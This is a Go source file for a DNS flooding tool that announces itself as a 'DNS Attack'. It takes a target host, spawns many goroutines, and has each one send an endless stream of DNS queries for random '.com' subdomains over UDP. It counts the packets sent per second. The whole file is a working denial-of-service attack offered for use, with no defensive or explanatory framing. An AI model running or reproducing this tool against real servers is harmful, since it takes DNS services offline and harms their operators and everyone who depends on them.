package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/PoulDev/dnsgo/pkg/dns"

	_ "net"
)

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func RandString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func spam_packets(target string, length int, counter chan int) {
	udpServer, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		panic(err)
	}

	conn, err := net.DialUDP("udp", nil, udpServer)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	count := 0

	for true {
		query := dns.NewQuery(RandString(length)+".com", 1, 1)
		raw := query.Dump()

		_, err = conn.Write(raw)
		if err != nil {
			fmt.Println("[!]", err)
		} else {
			count += 1
			if count >= 20 {
				counter <- count
				count = 0
			}
		}
	}
}

func main() {
	host := flag.String("host", "", "Target host")
	port := flag.Int("port", 53, "Target port")
	threads := flag.Int("threads", 30, "Number of threads")
	length := flag.Int("length", 10, "Length of requested domain")

	fmt.Println(`
	 ____  _   _ ____      ____       _
	|  _ \| \ | / ___|    / ___| ___ | |
	| | | |  \| \___ \   | |  _ / _ \| |
	| |_| | |\  |___) |  | |_| | (_) |_|
	|____/|_| \_|____( )  \____|\___/(_)
					 |/
	`)
	flag.Parse()

	if *host == "" {
		fmt.Println("ERROR: Please specify a target host")
		fmt.Println("Tip: use -help for more information")
		return
	}

	target := fmt.Sprintf("%s:%d", *host, *port)
	counter := make(chan int)
	total := 0
	last := 0
	var diff int

	fmt.Println("Starting DNS Attack against", target, "with", *threads, "threads")

	for range *threads {
		go spam_packets(target, *length, counter)
	}

	start := time.Now()
	for true {
		elapsed := time.Since(start)
		if elapsed > time.Second {
			fmt.Println("Second!")
			start = time.Now()

			diff = total - last
			last = total
		}
		total += <-counter

		fmt.Println("Sent", total, "packets", diff, "packets/sec")
	}
}
